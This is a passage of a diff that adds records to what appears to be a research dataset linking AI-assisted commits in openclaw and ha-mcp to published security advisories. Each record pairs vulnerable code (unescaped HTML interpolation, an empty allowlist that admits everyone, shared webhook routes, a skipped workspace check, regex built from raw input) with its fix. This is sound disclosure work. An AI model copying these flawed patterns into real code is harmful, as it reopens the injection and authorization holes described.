+   "mechanism": "The channel resolved each account by merging its overrides over the channel settings, and the webhook path fell back to the channel value or to a fixed default. Every named account that did not override the path therefore came out with one address, and the route registry keeps a single handler per address, so the accounts collapsed onto one route: the account that owned that route applied its own sender allowlist and direct-message policy to traffic that belonged to the other accounts, which is the separation the advisory is about. The repair refuses to start an account that inherits a shared path in a multi-account setup or that resolves to a path another enabled account already uses, and it registers the route without replacing an existing one.",
+   "cause_category": "validation_fail_open",
+   "ai_provenance": {
+    "family": "claude",
+    "coverage": "complete",
+    "candidate_count": 1,
+    "named_candidate_count": 1
+   },
+   "fix_authorship": {
+    "classification": "no_ai_marker",
+    "families": [],
+    "fixes": [
+     {
+      "sha": "980940aa58f862da4e19372597bbc2a9f268d70b",
+      "classification": "no_ai_marker",
+      "author": {
+       "name": "Peter Steinberger",
+       "email": "steipete@gmail.com"
+      }
+     }
+    ]
+   },
+   "code_evidence": {
+    "advisory_url": "https://github.com/advisories/ghsa-rqp8-q22p-5j9q",
+    "candidate_patch_sha256": "ce3b44849652b429f774b654086bce283bf170e5aeb6ca04116fd8f9b42b382f",
+    "candidate_url": "https://github.com/openclaw/openclaw/commit/03586e3d0057b5975090d50dadcc5bc95b51f977",
+    "display_hunks": [
+     {
+      "annotation": "The new account resolver inherits the channel-level webhook path whenever an account sets no path of its own, so several named accounts collapse onto one address.",
+      "code": "@@ -0,0 +68,9 @@\n+  // Merge: account override > base channel config > env var\n+  return {\n+    accountId: id,\n+    enabled: accountOverride.enabled ?? channelCfg.enabled ?? true,\n+    token: accountOverride.token ?? channelCfg.token ?? envToken,\n+    incomingUrl: accountOverride.incomingUrl ?? channelCfg.incomingUrl ?? envIncomingUrl,\n+    nasHost: accountOverride.nasHost ?? channelCfg.nasHost ?? envNasHost,\n+    webhookPath: accountOverride.webhookPath ?? channelCfg.webhookPath ?? \"/webhook/synology\",\n+    dmPolicy: accountOverride.dmPolicy ?? channelCfg.dmPolicy ?? \"allowlist\",",
+      "file": "extensions/synology-chat/src/accounts.ts",
+      "role": "candidate"
+     },
+     {
+      "annotation": "The repair refuses to start an account that inherits a shared webhook path in a multi-account setup or that resolves to a path another enabled account already uses, and the route registration no longer replaces an existing one.",
+      "code": "@@ -48,6 +55,38 @@ export function validateSynologyGatewayAccountStartup(params: {\n     );\n     return { ok: false };\n   }\n+  const accountIds = listCombinedAccountIds({\n+    configuredAccountIds: Object.keys(cfg.channels?.[\"synology-chat\"]?.accounts ?? {}),\n+    implicitAccountId:\n+      cfg.channels?.[\"synology-chat\"]?.token || process.env.SYNOLOGY_CHAT_TOKEN\n+        ? DEFAULT_ACCOUNT_ID\n+        : undefined,\n+  });\n+  const isMultiAccount = accountIds.length > 1;\n+  if (\n+    isMultiAccount &&\n+    accountId !== DEFAULT_ACCOUNT_ID &&\n+    !account.hasExplicitWebhookPath &&\n+    !account.dangerouslyAllowInheritedWebhookPath\n+  ) {\n+    log?.warn?.(\n+      `Synology Chat account ${accountId} must set an explicit webhookPath in multi-account setups; refusing inherited shared path. Set channels.synology-chat.accounts.${accountId}.webhookPath or opt in with dangerouslyAllowInheritedWebhookPath=true.`,\n+    );\n+    return { ok: false };\n+  }\n+  const conflictingAccounts = accountIds.filter((candidateId) => {\n+    if (candidateId === accountId) {\n+      return false;\n+    }\n+    const candidate = resolveAccount(cfg, candidateId);\n+    return candidate.enabled && candidate.webhookPath === account.webhookPath;\n+  });\n+  if (conflictingAccounts.length > 0) {\n+    log?.warn?.(\n+      `Synology Chat account ${accountId} conflicts on webhookPath ${account.webhookPath} with ${conflictingAccounts.join(\", \")}; refusing to start ambiguous shared route.`,\n+    );\n+    return { ok: false };\n+  }\n   return { ok: true };\n }\n \n@@ -73,7 +112,6 @@ export function registerSynologyWebhookRoute(params: {\n   const unregister = registerPluginHttpRoute({\n     path: account.webhookPath,\n     auth: \"plugin\",\n-    replaceExisting: true,\n     pluginId: CHANNEL_ID,\n     accountId: account.accountId,\n     log: (msg: string) => log?.info?.(msg),",
+      "file": "extensions/synology-chat/src/gateway-runtime.ts",
+      "role": "fix"
+     }
+    ],
+    "fix_patch_sha256": "adabb41c3afb785996b3e9ce46ee3808937ccbaa3d49e45affe7fb1133824fd9",
+    "fix_url": "https://github.com/openclaw/openclaw/commit/980940aa58f862da4e19372597bbc2a9f268d70b",
+    "steps": [
+     {
+      "detail": "The new channel let each account inherit the channel-level webhook path, so named accounts that did not set their own path all resolved to one address and shared a single route under one account's policy.",
+      "title": "AI change"
+     },
+     {
+      "detail": "Startup now refuses an account that inherits a shared path in a multi-account setup or that resolves to a path another enabled account already uses, and the route is registered without replacing an existing one.",
+      "title": "Fix"
+     }
+    ],
+    "summary": "An AI-assisted change added a Synology Chat channel in which every account inherited the channel-level webhook path, so accounts that did not set their own path resolved to the same address and one account's route took over the traffic of the others under the wrong sender rules."
+   },
+   "ir_chain": null,
+   "unpatched": null,
+   "advisory_url": "https://github.com/advisories/ghsa-rqp8-q22p-5j9q",
+   "publication_issues": [],
+   "publication_status": "confirmed"
+  },
+  {
    "case_id": "GHSA-FPMV-5WGW-QHHR",
    "aliases": [
     "CVE-2026-34218"
@@ -32888,6 +33523,141 @@
    "ir_chain": null,
    "unpatched": null,
    "advisory_url": "https://github.com/advisories/ghsa-g353-mgv3-8pcj",
+   "publication_issues": [],
+   "publication_status": "confirmed"
+  },
+  {
+   "case_id": "GHSA-PF93-J98V-25PV",
+   "aliases": [
+    "CVE-2026-32112"
+   ],
+   "repository": "homeassistant-ai/ha-mcp",
+   "repository_metadata": {
+    "full_name": "homeassistant-ai/ha-mcp",
+    "language": "Python",
+    "archived": false
+   },
+   "contribution_class": "AI_DIRECT_ROOT",
+   "candidate_set": [
+    "39806871c9720bf8afdcf3e061095c0dd63dea7f",
+    "aae7acba91dc21fc897ef6b78989b1f548c4083e"
+   ],
+   "carrier_set": [
+    "39806871c9720bf8afdcf3e061095c0dd63dea7f"
+   ],
+   "minimum_fix_set": [
+    "dc8eaa16a8550f885614655f14b6fd9fe429b278"
+   ],
+   "gates": {
+    "ai_hunk": "PASS",
+    "but_for": "PASS",
+    "fix_reversal": "PASS",
+    "identity": "PASS",
+    "release": "PASS",
+    "topology": "PASS",
+    "uniqueness": "PASS"
+   },
+   "vulnerable_release": {
+    "contains_candidate_ancestor": true,
+    "contains_fix_ancestor": false,
+    "kind": "git_tag",
+    "sha": "a526e3347c6c508f29a4b40974fb1133a579100f",
+    "tag": "v6.3.0"
+   },
+   "fixed_release": {
+    "contains_fix_ancestor": true,
+    "kind": "git_tag",
+    "sha": "1f2bbbc74e81933a39e9c63998d1408f0c198309",
+    "tag": "v7.0.0"
+   },
+   "published_at": "2026-03-12",
+   "severity": null,
+   "cwes": [],
+   "description": "OAuth mode is a beta feature of ha-mcp that needs MCP_BASE_URL and serves the consent endpoint on every interface, so anyone who can reach it can register a dynamic client without an initial access token. The consent form shown to the operator was built from Python f-strings: the application name was printed as markup, the client id, redirect URI and state were printed inside hidden input value attributes, and the error pages printed the error code and description, all without escaping. A registered application name carrying markup therefore executed in the operator's browser, and an injected quote could add attributes or tags of the attacker's choosing. Exploitation needs the operator to open a crafted authorization link for an application they do not recognize, and the prize is the Home Assistant access token entered on that page. Release 7.0.0 escapes every interpolated value and displays the redirect domain instead of the application name.",
+   "references": [],
+   "mechanism": "The consent page was assembled from f-strings and none of the interpolated values were escaped, so the registered application name appeared as markup and the client id, redirect URI and state sat inside hidden field value attributes, where a double quote ends the attribute and lets an attacker add further markup. The error views printed the OAuth error code and description the same way. Client registration is open by design, so an attacker registers an application whose fields carry the payload and sends the operator the authorization link; script running on that page reads the Home Assistant long-lived access token the operator types in and sends it to the attacker. The remedy escapes every interpolated value and stops displaying the application name.",
+   "cause_category": "auth_access",
+   "ai_provenance": {
+    "family": "openai_gpt_codex",
+    "coverage": "complete",
+    "candidate_count": 2,
+    "named_candidate_count": 2
+   },
+   "fix_authorship": {
+    "classification": "ai_assisted",
+    "families": [
+     "claude"
+    ],
+    "fixes": [
+     {
+      "sha": "dc8eaa16a8550f885614655f14b6fd9fe429b278",
+      "classification": "ai_assisted",
+      "author": {
+       "name": "Julien Larocque-Dupont",
+       "email": "github@qc-h.net"
+      }
+     }
+    ]
+   },
+   "code_evidence": {
+    "advisory_url": "https://github.com/advisories/ghsa-pf93-j98v-25pv",
+    "candidate_patch_sha256": "4b2b2ef5200d0555b6c41a7c5625e0ec1712f49881c48e74f9a67908c643777c",
+    "candidate_url": "https://github.com/homeassistant-ai/ha-mcp/commit/39806871c9720bf8afdcf3e061095c0dd63dea7f",
+    "display_hunks": [
+     {
+      "annotation": "The new page prints the application name as markup and puts the client id, redirect URI and state into hidden field values with no escaping, so each of those strings can close its context and inject.",
+      "code": "@@ -0,0 +294,26 @@ def create_consent_html(\n+        <div class=\"client-info\">\n+            <p>Application: <strong>{display_name}</strong></p>\n+        </div>\n+\n+        {error_html}\n+\n+        <form method=\"POST\" id=\"consent-form\">\n+            <input type=\"hidden\" name=\"client_id\" value=\"{client_id}\">\n+            <input type=\"hidden\" name=\"redirect_uri\" value=\"{redirect_uri}\">\n+            <input type=\"hidden\" name=\"state\" value=\"{state}\">\n+\n+            <div class=\"form-group\">\n+                <label for=\"ha_url\">Home Assistant URL</label>\n",
+      "file": "src/ha_mcp/auth/consent_form.py",
+      "role": "candidate"
+     },
+     {
+      "annotation": "The repairing change escapes each value before it reaches the template and keeps the escaped copy in a local whose name marks it as safe, so the page can no longer be broken out of.",
+      "code": "@@ -38,7 +47,13 @@ def create_consent_html(\n     domain = _extract_domain(redirect_uri)\n+    safe_domain = html.escape(domain)\n+    safe_client_id = html.escape(client_id)\n+    safe_redirect_uri = html.escape(redirect_uri)\n+    safe_state = html.escape(state)\n+    safe_txn_id = html.escape(txn_id)\n \n     error_html = \"\"\n     if error_message:\n+        safe_error = html.escape(error_message)\n         error_html = f\"\"\"\n@@ -310,3 +319,3 @@ def create_consent_html(\n-            <input type=\"hidden\" name=\"client_id\" value=\"{client_id}\">\n-            <input type=\"hidden\" name=\"redirect_uri\" value=\"{redirect_uri}\">\n-            <input type=\"hidden\" name=\"state\" value=\"{state}\">\n+            <input type=\"hidden\" name=\"client_id\" value=\"{safe_client_id}\">\n+            <input type=\"hidden\" name=\"redirect_uri\" value=\"{safe_redirect_uri}\">\n+            <input type=\"hidden\" name=\"state\" value=\"{safe_state}\">\n",
+      "file": "src/ha_mcp/auth/consent_form.py",
+      "role": "fix"
+     }
+    ],
+    "fix_patch_sha256": "0cf15158113cb108c1cbcb19ca1f3f7dd34788896adec31994d1bb1b8ad9c2d4",
+    "fix_url": "https://github.com/homeassistant-ai/ha-mcp/commit/dc8eaa16a8550f885614655f14b6fd9fe429b278",
+    "steps": [
+     {
+      "detail": "The consent form entered the codebase with f-string HTML that interpolated the registered application name, the client id, redirect URI, state and the error text without escaping any of them, which made those attacker-controlled strings markup in the operator's browser.",
+      "title": "AI change"
+     },
+     {
+      "detail": "Every interpolated value now passes through html.escape into a local named safe before it reaches the page, and the application name is no longer displayed at all, which removes the injection points instead of filtering particular characters.",
+      "title": "Fix"
+     }
+    ],
+    "summary": "An AI-assisted change added an OAuth consent form that wrote the client name, client id, redirect URI, state and error text into HTML through Python f-strings, so a registration an attacker controls could run script in the browser of the operator who opens the page."
+   },
+   "ir_chain": null,
+   "candidate_sources": [
+    {
+     "sha": "39806871c9720bf8afdcf3e061095c0dd63dea7f",
+     "repository": "homeassistant-ai/ha-mcp"
+    },
+    {
+     "sha": "aae7acba91dc21fc897ef6b78989b1f548c4083e",
+     "repository": "homeassistant-ai/ha-mcp"
+    }
+   ],
+   "candidate_fix_edges": [
+    {
+     "candidate_sha": "39806871c9720bf8afdcf3e061095c0dd63dea7f",
+     "carrier_sha": null,
+     "fix_sha": "dc8eaa16a8550f885614655f14b6fd9fe429b278",
+     "origin_kind": "direct_commit"
+    },
+    {
+     "candidate_sha": "aae7acba91dc21fc897ef6b78989b1f548c4083e",
+     "carrier_sha": "39806871c9720bf8afdcf3e061095c0dd63dea7f",
+     "fix_sha": "dc8eaa16a8550f885614655f14b6fd9fe429b278",
+     "origin_kind": "upstream_atomic"
+    }
+   ],
+   "unpatched": null,
+   "advisory_url": "https://github.com/advisories/ghsa-pf93-j98v-25pv",
    "publication_issues": [],
    "publication_status": "confirmed"
   },
@@ -34714,6 +35484,233 @@
    "publication_status": "confirmed"
   },
   {
+   "case_id": "GHSA-GW85-XP4Q-5GP9",
+   "aliases": [
+    "CVE-2026-31998"
+   ],
+   "repository": "openclaw/openclaw",
+   "repository_metadata": {
+    "full_name": "openclaw/openclaw",
+    "language": "TypeScript",
+    "archived": false
+   },
+   "contribution_class": "AI_DIRECT_ROOT",
+   "candidate_set": [
+    "03586e3d0057b5975090d50dadcc5bc95b51f977"
+   ],
+   "carrier_set": [
+    "9a3800d8e6e69bc0a125dca5760d47515e746454"
+   ],
+   "minimum_fix_set": [
+    "0ee30361b8f6ef3f110f3a7b001da6dd3df96bb5",
+    "7dfac701858ce0efdb373eb90c729de8d4b46676"
+   ],
+   "gates": {
+    "ai_hunk": "PASS",
+    "but_for": "PASS",
+    "fix_reversal": "PASS",
+    "identity": "PASS",
+    "release": "PASS",
+    "topology": "PASS",
+    "uniqueness": "PASS"
+   },
+   "vulnerable_release": {
+    "contains_candidate_ancestor": true,
+    "contains_fix_ancestor": false,
+    "kind": "git_tag",
+    "sha": "a54dc7fe80fc02e2a02e6901668a468fcb0cf8b4",
+    "tag": "v2026.2.22"
+   },
+   "fixed_release": {
+    "contains_fix_ancestor": true,
+    "kind": "git_tag",
+    "sha": "51d76eb13a24c0ebd95abd95745693a3cf7f85af",
+    "tag": "v2026.2.24"
+   },
+   "published_at": "2026-03-03",
+   "severity": null,
+   "cwes": [],
+   "description": "The Synology Chat channel added in openclaw 2026.2.22 resolved its direct-message policy to allowlist by default and checked inbound senders against the configured allowed user list. That check ran through a helper which answered yes when the list was empty, so an operator who enabled the channel without naming any users got the opposite of the stated policy: the webhook accepted every sender Synology Chat delivered, and each message was dispatched to the agent with whatever tools the agent held. The released fix removes the empty-list shortcut so the helper matches nobody, and the handler now answers an empty allowlist with an explicit rejection instead of falling through to dispatch.",
+   "references": [],
+   "mechanism": "The Synology Chat webhook handler authorized allowlist mode through a helper that returned true whenever the allowed list was empty. With the channel's default allowlist policy and no configured users, every inbound sender cleared the authorization check and reached agent dispatch, so the agent and its tools acted on messages from senders the operator never admitted. The fix deletes the empty-list shortcut and rejects the request with an explicit authorization error before dispatch when the allowlist is empty.",
+   "cause_category": "auth_access",
+   "ai_provenance": {
+    "family": "claude",
+    "coverage": "complete",
+    "candidate_count": 1,
+    "named_candidate_count": 1
+   },
+   "fix_authorship": {
+    "classification": "no_ai_marker",
+    "families": [],
+    "fixes": [
+     {
+      "sha": "0ee30361b8f6ef3f110f3a7b001da6dd3df96bb5",
+      "classification": "no_ai_marker",
+      "author": {
+       "name": "Peter Steinberger",
+       "email": "steipete@gmail.com"
+      }
+     },
+     {
+      "sha": "7dfac701858ce0efdb373eb90c729de8d4b46676",
+      "classification": "no_ai_marker",
+      "author": {
+       "name": "Peter Steinberger",
+       "email": "steipete@gmail.com"
+      }
+     }
+    ]
+   },
+   "code_evidence": {
+    "advisory_url": "https://github.com/advisories/ghsa-gw85-xp4q-5gp9",
+    "candidate_patch_sha256": "698c58fd8c2b877783cc5027731b7fefd3b263c605418ce4137454773d5e2f84",
+    "candidate_url": "https://github.com/openclaw/openclaw/commit/03586e3d0057b5975090d50dadcc5bc95b51f977",
+    "display_hunks": [
+     {
+      "annotation": "The new helper let an empty allowlist match every sender, and the webhook gate used it as the allowlist decision, so an unset list admitted anyone who reached the endpoint.",
+      "code": "@@ -0,0 +1,112 @@\n+/**\n+ * Security module: token validation, rate limiting, input sanitization, user allowlist.\n+ */\n+\n+import * as crypto from \"node:crypto\";\n+\n+/**\n+ * Validate webhook token using constant-time comparison.\n+ * Prevents timing attacks that could leak token bytes.\n+ */\n+export function validateToken(received: string, expected: string): boolean {\n+  if (!received || !expected) return false;\n+\n+  // Use HMAC to normalize lengths before comparison,\n+  // preventing timing side-channel on token length.\n+  const key = \"openclaw-token-cmp\";\n+  const a = crypto.createHmac(\"sha256\", key).update(received).digest();\n+  const b = crypto.createHmac(\"sha256\", key).update(expected).digest();\n+\n+  return crypto.timingSafeEqual(a, b);\n+}\n+\n+/**\n+ * Check if a user ID is in the allowed list.\n+ * Empty allowlist = allow all users.\n+ */\n+export function checkUserAllowed(userId: string, allowedUserIds: string[]): boolean {\n+  if (allowedUserIds.length === 0) return true;\n+  return allowedUserIds.includes(userId);\n+}\n",
+      "file": "extensions/synology-chat/src/security.ts",
+      "role": "candidate"
+     },
+     {
+      "annotation": "The fix deletes the empty-list shortcut, so an empty allowlist no longer admits a sender and the request is rejected before the message reaches dispatch.",
+      "code": "@@ -22,10 +22,9 @@ export function validateToken(received: string, expected: string): boolean {\n \n /**\n  * Check if a user ID is in the allowed list.\n- * Empty allowlist = allow all users.\n+ * Allowlist mode must be explicit; empty lists should not match any user.\n  */\n export function checkUserAllowed(userId: string, allowedUserIds: string[]): boolean {\n-  if (allowedUserIds.length === 0) return true;\n   return allowedUserIds.includes(userId);\n }\n \n",
+      "file": "extensions/synology-chat/src/security.ts",
+      "role": "fix"
+     }
+    ],
+    "fix_patch_sha256": "3eea9439a76fdd5ffd8d69da15b499dc414a93ca5ccb6b0257593a6a87037041",
+    "fix_url": "https://github.com/openclaw/openclaw/commit/0ee30361b8f6ef3f110f3a7b001da6dd3df96bb5",
+    "steps": [
+     {
+      "detail": "The Claude-coauthored channel addition brought in the allowlist helper that treated an empty list as a match for any sender, together with the webhook gate that used it as the sole authorization decision.",
+      "title": "AI change"
+     },
+     {
+      "detail": "The fix drops the empty-list shortcut so the helper matches nobody, and the webhook handler now answers an empty allowlist with an explicit rejection before any dispatch.",
+      "title": "Fix"
+     }
+    ],
+    "summary": "Openclaw 2026.2.22 and 2026.2.23 shipped the Synology Chat channel with an empty allowlist treated as permission for every sender, so a deployment on the default allowlist policy accepted messages from unauthorized senders and passed them to agent dispatch."
+   },
+   "ir_chain": null,
+   "unpatched": null,
+   "advisory_url": "https://github.com/advisories/ghsa-gw85-xp4q-5gp9",
+   "publication_issues": [],
+   "publication_status": "confirmed"
+  },
+  {
+   "case_id": "GHSA-9F72-QCPW-2HXC",
+   "aliases": [],
+   "repository": "openclaw/openclaw",
+   "repository_metadata": {
+    "full_name": "openclaw/openclaw",
+    "language": "TypeScript",
+    "archived": false
+   },
+   "contribution_class": "AI_DIRECT_ROOT",
+   "candidate_set": [
+    "8d74578ceb0c3b913555dff6265821eb0fc09749"
+   ],
+   "carrier_set": [],
+   "minimum_fix_set": [
+    "370d115549c0dadace0902775eea0d5094aedfdc"
+   ],
+   "gates": {
+    "ai_hunk": "PASS",
+    "but_for": "PASS",
+    "fix_reversal": "PASS",
+    "identity": "PASS",
+    "release": "PASS",
+    "topology": "PASS",
+    "uniqueness": "PASS"
+   },
+   "vulnerable_release": {
+    "contains_candidate_ancestor": true,
+    "contains_fix_ancestor": false,
+    "kind": "git_tag",
+    "sha": "b817600533129771ace2801d7c05901c7f850fb8",
+    "tag": "v2026.2.23"
+   },
+   "fixed_release": {
+    "contains_fix_ancestor": true,
+    "kind": "git_tag",
+    "sha": "51d76eb13a24c0ebd95abd95745693a3cf7f85af",
+    "tag": "v2026.2.24"
+   },
+   "published_at": "2026-03-03",
+   "severity": null,
+   "cwes": [],
+   "description": "The embedded agent runner gained a native image path: when the active model accepts images, the runner scans the current prompt and earlier user messages for image references, loads each referenced file, and attaches the result to the request as vision input. Paths on that path were resolved with the sandbox filesystem bridge, which maps a requested path onto the session's mounts, and a path under a mounted directory resolves successfully even when it sits outside the workspace.\n\nThat gap left images reachable through any mounted directory. With a sandbox in a workspace-only configuration, a prompt or a stored message that named a path under a mount such as /agent/secret.png had the file read and sent to the model as an image. The fix puts the workspace check back on the auto-load path: the loader takes a workspace-only flag from the effective agent configuration, checks each resolved path against the allowed root before reading, and the added tests drive both the current prompt and a history reference through a sandbox that mounts a directory outside the workspace.",
+   "references": [],
+   "mechanism": "A prompt image loader turned each detected reference into a file read, and with a sandbox in play it resolved that path through the sandbox filesystem bridge, which maps the session's mounts to host paths; anything that mapped into a mount was accepted, so the workspace-only restriction the file tools enforce was never applied to the images the runner pulled into the prompt.",
+   "cause_category": "injection",
+   "ai_provenance": {
+    "family": "claude",
+    "coverage": "complete",
+    "candidate_count": 1,
+    "named_candidate_count": 1
+   },
+   "fix_authorship": {
+    "classification": "no_ai_marker",
+    "families": [],
+    "fixes": [
+     {
+      "sha": "370d115549c0dadace0902775eea0d5094aedfdc",
+      "classification": "no_ai_marker",
+      "author": {
+       "name": "Peter Steinberger",
+       "email": "steipete@gmail.com"
+      }
+     }
+    ]
+   },
+   "code_evidence": {
+    "advisory_url": "https://github.com/advisories/ghsa-9f72-qcpw-2hxc",
+    "candidate_patch_sha256": "ea2d5eb364431f5e3d64313bcd6d0ff9892cabc8b3c15f78e0b5b3ae8c7dbbfc",
+    "candidate_url": "https://github.com/openclaw/openclaw/commit/8d74578ceb0c3b913555dff6265821eb0fc09749",
+    "display_hunks": [
+     {
+      "annotation": "The auto-load path arrived with a sandbox-root guard and nothing else: the loader's options hold a byte limit and a sandbox root, so there was no workspace-only decision to make on this path.",
+      "code": "--- /dev/null\n+++ b/src/agents/pi-embedded-runner/run/images.ts\n@@ -0,0 +1,379 @@\n+export async function loadImageFromRef(\n+  ref: DetectedImageRef,\n+  workspaceDir: string,\n+  options?: {\n+    maxBytes?: number;\n+    /** If set, enforce that file paths are within this sandbox root */\n+    sandboxRoot?: string;\n+  },\n+): Promise<ImageContent | null> {\n+  try {\n+    let targetPath = ref.resolved;\n+\n+    // When sandbox is enabled, block remote URL loading to maintain network boundary\n+    if (ref.type === \"url\" && options?.sandboxRoot) {\n+      log.debug(`Native image: rejecting remote URL in sandboxed session: ${ref.resolved}`);\n+      return null;\n+    }\n+\n+    // For file paths, resolve relative to the appropriate root:\n+    // - When sandbox is enabled, resolve relative to sandboxRoot for security\n+    // - Otherwise, resolve relative to workspaceDir\n+    if (ref.type === \"path\" && !path.isAbsolute(targetPath)) {\n+      const resolveRoot = options?.sandboxRoot ?? workspaceDir;\n+      targetPath = path.resolve(resolveRoot, targetPath);\n+    }\n+\n+    // Enforce sandbox restrictions if sandboxRoot is set\n+    if (ref.type === \"path\" && options?.sandboxRoot) {\n+      try {\n+        const validated = await assertSandboxPath({\n+          filePath: targetPath,\n+          cwd: options.sandboxRoot,\n+          root: options.sandboxRoot,\n+        });\n+        targetPath = validated.resolved;\n+      } catch (err) {\n+        // Log the actual error for debugging (sandbox violation or other path error)\n+        log.debug(`Native image: sandbox validation failed for ${ref.resolved}: ${err instanceof Error ? err.message : String(err)}`);\n+        return null;\n+      }\n+    }",
+      "file": "src/agents/pi-embedded-runner/run/images.ts",
+      "role": "candidate"
+     },
+     {
+      "annotation": "The fix gives the loader a workspace-only flag, rejects any resolved path outside the allowed root before the file is read, and passes the flag from the auto-load caller, so the setting now reaches prompt and history images.",
+      "code": "@@ -181,6 +182,7 @@ export async function loadImageFromRef(\n   workspaceDir: string,\n   options?: {\n     maxBytes?: number;\n+    workspaceOnly?: boolean;\n     sandbox?: { root: string; bridge: SandboxFsBridge };\n   },\n ): Promise<ImageContent | null> {\n@@ -211,6 +213,14 @@ export async function loadImageFromRef(\n       } else if (!path.isAbsolute(targetPath)) {\n         targetPath = path.resolve(workspaceDir, targetPath);\n       }\n+      if (options?.workspaceOnly) {\n+        const root = options?.sandbox?.root ?? workspaceDir;\n+        await assertSandboxPath({\n+          filePath: targetPath,\n+          cwd: root,\n+          root,\n+        });\n+      }\n     }\n \n     // loadWebMedia handles local file paths (including file:// URLs)\n@@ -422,6 +433,7 @@ export async function detectAndLoadPromptImages(params: {\n   for (const ref of allRefs) {\n     const image = await loadImageFromRef(ref, params.workspaceDir, {\n       maxBytes: params.maxBytes,\n+      workspaceOnly: params.workspaceOnly,\n       sandbox: params.sandbox,\n     });\n     if (image) {",
+      "file": "src/agents/pi-embedded-runner/run/images.ts",
+      "role": "fix"
+     },
+     {
+      "annotation": "The flag is derived from the effective agent configuration, which is how a per-agent workspace-only setting reaches the image auto-load path the same way it already reached the file tools.",
+      "code": "@@ -363,6 +363,9 @@ export async function runEmbeddedAttempt(\n       config: params.config,\n       agentId: params.agentId,\n     });\n+    const effectiveFsWorkspaceOnly =\n+      (resolveAgentConfig(params.config ?? {}, sessionAgentId)?.tools?.fs?.workspaceOnly ??\n+        params.config?.tools?.fs?.workspaceOnly) === true;\n     // Check if the model supports native image input\n     const modelHasVision = params.model.input?.includes(\"image\") ?? false;\n     const toolsRaw = params.disableTools\n@@ -1087,6 +1090,7 @@ export async function runEmbeddedAttempt(\n             historyMessages: activeSession.messages,\n             maxBytes: MAX_IMAGE_BYTES,\n             maxDimensionPx: resolveImageSanitizationLimits(params.config).maxDimensionPx,\n+            workspaceOnly: effectiveFsWorkspaceOnly,\n             // Enforce sandbox path restrictions when sandbox is enabled\n             sandbox:\n               sandbox?.enabled && sandbox?.fsBridge",
+      "file": "src/agents/pi-embedded-runner/run/attempt.ts",
+      "role": "fix"
+     }
+    ],
+    "fix_patch_sha256": "1b903e9ccbf048cbdc4464b105eefe41d0d2c0eadcae0065186e7344c21bf186",
+    "fix_url": "https://github.com/openclaw/openclaw/commit/370d115549c0dadace0902775eea0d5094aedfdc",
+    "steps": [
+     {
+      "detail": "The vision feature added the auto-load path that scans a prompt and earlier turns for image references, loads the files and attaches them to the request; its only sandbox guard compared paths to a sandbox root, and the workspace-only setting that the file tools later gained was never consulted here.",
+      "title": "AI change"
+     },
+     {
+      "detail": "The loader now takes the workspace-only flag from the effective agent configuration, rejects any resolved path that falls outside the allowed root, and skips the image; the new tests exercise a prompt reference and a history reference against a sandbox that mounts a directory outside the workspace.",
+      "title": "Fix"
+     }
+    ],
+    "summary": "OpenClaw's native prompt image auto-load read images named in a message or kept from earlier turns and attached them to the model's context, but the loader resolved paths through the sandbox mount table without consulting the workspace-only setting, so an image mounted outside the workspace could still reach the vision model."
+   },
+   "ir_chain": null,
+   "unpatched": null,
+   "advisory_url": "https://github.com/advisories/ghsa-9f72-qcpw-2hxc",
+   "publication_issues": [],
+   "publication_status": "confirmed"
+  },
+  {
    "case_id": "GHSA-3CVX-236H-M9FJ",
    "aliases": [
     "CVE-2026-32034"
@@ -34973,6 +35970,121 @@
    "ir_chain": null,
    "unpatched": null,
    "advisory_url": "https://github.com/advisories/ghsa-rxxp-482v-7mrh",
+   "publication_issues": [],
+   "publication_status": "confirmed"
+  },
+  {
+   "case_id": "GHSA-C6HR-W26Q-C636",
+   "aliases": [
+    "CVE-2026-22178"
+   ],
+   "repository": "openclaw/openclaw",
+   "repository_metadata": {
+    "full_name": "openclaw/openclaw",
+    "language": "TypeScript",
+    "archived": false
+   },
+   "contribution_class": "AI_DIRECT_ROOT",
+   "candidate_set": [
+    "2267d58afcc70fe19408b8f0dce108c340f3426d"
+   ],
+   "carrier_set": [],
+   "minimum_fix_set": [
+    "7e67ab75cc2f0e93569d12fecd1411c2961fcc8c",
+    "74268489137510b6f6349919d1e197b17290d92c"
+   ],
+   "gates": {
+    "ai_hunk": "PASS",
+    "but_for": "PASS",
+    "fix_reversal": "PASS",
+    "identity": "PASS",
+    "release": "PASS",
+    "topology": "PASS",
+    "uniqueness": "PASS"
+   },
+   "vulnerable_release": {
+    "contains_candidate_ancestor": true,
+    "contains_fix_ancestor": false,
+    "kind": "git_tag",
+    "sha": "0dd7033521053ec5f4a325dcc64146a47f487d82",
+    "tag": "v2026.2.6"
+   },
+   "fixed_release": {
+    "contains_fix_ancestor": true,
+    "kind": "git_tag",
+    "sha": "2c05cbb43e48ebad03626d3125746fb1b9a8520f",
+    "tag": "v2026.2.19"
+   },
+   "published_at": "2026-03-02",
+   "severity": null,
+   "cwes": [],
+   "description": "Inbound Feishu messages carry a mention list alongside the text, and the plugin removed each mention from the body before handing the result to the agent. That removal built a regular expression directly from the mention name and from the mention key, with no escaping, so anything a sender could place in that metadata became part of the pattern.\n\nTwo consequences follow. A name shaped as a nested quantifier turns a single message into exponential backtracking and blocks the channel while it runs, and a name shaped as a pattern fragment changes which parts of the message are deleted before the model sees them. The fix escapes metacharacters in both values before the pattern is compiled, and the neighbouring mention helper in the same plugin already applied that escaping, so the safe form was present in the extension all along.",
+   "references": [],
+   "mechanism": "The mention-stripping helper turned every mention name and mention key into a regular expression source string instead of matching them as literal text, so metacharacters carried by that metadata were executed as pattern syntax: a nested-quantifier name makes each non-matching message backtrack exponentially, and an injected anchor or alternation removes content that was never meant to be stripped.",
+   "cause_category": "injection",
+   "ai_provenance": {
+    "family": "claude",
+    "coverage": "complete",
+    "candidate_count": 1,
+    "named_candidate_count": 1
+   },
+   "fix_authorship": {
+    "classification": "no_ai_marker",
+    "families": [],
+    "fixes": [
+     {
+      "sha": "7e67ab75cc2f0e93569d12fecd1411c2961fcc8c",
+      "classification": "no_ai_marker",
+      "author": {
+       "name": "Jamie",
+       "email": "6668807+orlyjamie@users.noreply.github.com"
+      }
+     },
+     {
+      "sha": "74268489137510b6f6349919d1e197b17290d92c",
+      "classification": "no_ai_marker",
+      "author": {
+       "name": "Peter Steinberger",
+       "email": "steipete@gmail.com"
+      }
+     }
+    ]
+   },
+   "code_evidence": {
+    "advisory_url": "https://github.com/advisories/ghsa-c6hr-w26q-c636",
+    "candidate_patch_sha256": "a1506eaa9222d1f4769105e59d4b476f89f728796130bc75892d6ee265a95088",
+    "candidate_url": "https://github.com/openclaw/openclaw/commit/2267d58afcc70fe19408b8f0dce108c340f3426d",
